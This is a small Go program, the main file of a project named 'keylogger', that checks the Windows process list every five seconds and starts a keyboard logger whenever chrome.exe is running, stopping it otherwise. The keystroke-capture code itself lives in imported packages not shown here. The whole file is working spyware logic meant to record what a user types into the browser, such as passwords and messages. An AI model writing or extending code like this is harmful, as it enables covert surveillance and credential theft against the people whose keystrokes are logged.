package main

import (
	"fmt"
	"keylogger/pkg/keyboardlogger"
	"keylogger/pkg/winprocessutils"
	"log"
	"time"
)

func main() {
	for {
		procs, err := winprocessutils.Processes()
		if err != nil {
			log.Fatal(err)
		}
		chrome := winprocessutils.FindProcessByName(procs, "chrome.exe")
		if chrome != nil {
			// found it
			keyboardlogger.StartKeyboardLogger()
			fmt.Println("Chrome is open!")
		} else {
			keyboardlogger.StopKeyboardLogger()
		}
		time.Sleep(5 * time.Second)
		fmt.Printf("hey its been five seconds")
	}

}
